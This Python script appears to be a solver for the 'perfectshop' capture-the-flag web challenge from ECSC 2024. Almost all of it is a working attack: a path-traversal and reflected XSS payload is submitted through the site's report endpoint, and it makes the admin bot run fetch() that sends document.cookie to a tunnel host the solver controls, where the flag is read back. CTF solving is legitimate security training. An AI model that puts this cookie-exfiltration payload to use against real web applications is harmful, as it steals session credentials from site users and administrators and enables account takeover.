#!/usr/bin/env python3

import logging
import os
import requests
import tunnel
import urllib.parse

logging.disable()

# For HTTP connection
URL = os.environ.get("URL", "http://perfectshop.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

with tunnel.open_http_tunnel() as t:
    ngrok_url = f"http://{t.remote_host}:{t.remote_port}"

    payload = '1/../../search?fetch(`' + ngrok_url + '/${document.cookie}`)//&q=<script>eval(location.search.slice(1))</script>&/admin'
    r = requests.post(URL + "/report?/admin", data={"id": payload, "message": "x"})
    assert 'Report submitted successfully' in r.text

    _, path, _, _ = t.wait_request()
    t.send_response(200, {}, b'')

    assert ('flag' in path)

    # url decode flag
    flag = urllib.parse.unquote(path.split('=')[1])

print(flag)
